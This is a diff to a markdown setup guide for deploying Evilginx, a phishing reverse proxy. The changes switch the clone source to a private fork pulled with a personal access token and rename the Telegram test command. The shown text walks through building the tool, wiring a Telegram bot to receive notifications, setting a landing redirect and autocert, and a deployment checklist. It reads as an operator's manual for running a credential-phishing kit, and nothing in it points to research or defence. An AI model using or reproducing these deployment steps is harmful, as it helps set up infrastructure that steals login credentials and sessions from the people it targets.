@@ -156,11 +156,12 @@ Both must return your VPS IP.
 
 # PART 5: BUILD EVILGINX
 
+Replace `YOUR_PAT` with a GitHub Personal Access Token that has **repo** scope for `michaelinbox02-star/evilginx2`.
+
 ```bash
 cd /root
-git clone https://github.com/afrikaquality/evilginx2.git
+git clone https://YOUR_PAT@github.com/michaelinbox02-star/evilginx2.git evilginx2
 cd evilginx2
-go mod tidy
 go build -mod=mod -o evilginx2 .
 chmod +x evilginx2
 ls -lh evilginx2
@@ -279,7 +280,7 @@ Find `"chat":{"id":XXXXXXXX}` — that number is your Chat ID.
 ```
 config teletoken YOUR_BOT_TOKEN
 config chatid YOUR_CHAT_ID
-test telegram
+config telegram test
 exit
 ```
 
@@ -684,7 +685,7 @@ redirects add landing loading.html on
 
 | Command | Description |
 |---------|-------------|
-| `test telegram` | Send a test Telegram message |
+| `config telegram test` | Send a test Telegram message |
 | `clear` | Clear the terminal |
 | `help` | List all commands |
 | `exit` | Exit Evilginx (saves config) |
@@ -770,7 +771,7 @@ reboot
 curl -s "https://api.telegram.org/botYOUR_TOKEN/getMe"
 
 # From Evilginx terminal
-test telegram
+config telegram test
 ```
 
 Check that `config teletoken` and `config chatid` are both set.
@@ -824,7 +825,7 @@ If `go: command not found`, run `source ~/.bashrc` or reconnect SSH.
 - [ ] `config autocert on`
 - [ ] `config unauth_url` set
 - [ ] `config teletoken` and `config chatid` set
-- [ ] `test telegram` succeeds
+- [ ] `config telegram test` succeeds
 
 ### GeoIP
 - [ ] `GeoLite2-City.mmdb` and `GeoLite2-ASN.mmdb` in `/root/.evilginx/GeoIP/`
